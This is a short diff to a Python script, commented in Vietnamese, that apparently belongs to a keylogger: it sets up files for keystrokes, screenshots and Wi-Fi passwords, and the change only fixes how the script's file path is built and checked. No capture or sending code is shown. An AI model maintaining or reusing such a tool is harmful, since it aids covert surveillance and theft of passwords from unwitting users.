@@ -57,10 +57,12 @@ file_names = [
     "wifi.txt",
 ]
 
+file_path = os.path.dirname(os.path.abspath(__file__)) + "\\"
+
 # Duyệt qua danh sách file
 for file_name in file_names:
     # Kiểm tra file có tồn tại hay không
-    if not os.path.exists(file_name):
+    if not os.path.exists(file_path + file_name):
         # Tạo file mới
         open(file_name, "w").close()
 
@@ -70,7 +72,6 @@ screenshot_information = "screenshot.png"
 keys_information = "key_log.txt"
 wifipass_information = "wifi.txt"
 
-file_path = os.path.dirname(os.path.abspath(__file__)) + "Keylogger\\"
 
 # Thời gian chạy
 time_iteration = 60  # Thời gian lặp lại chương trình
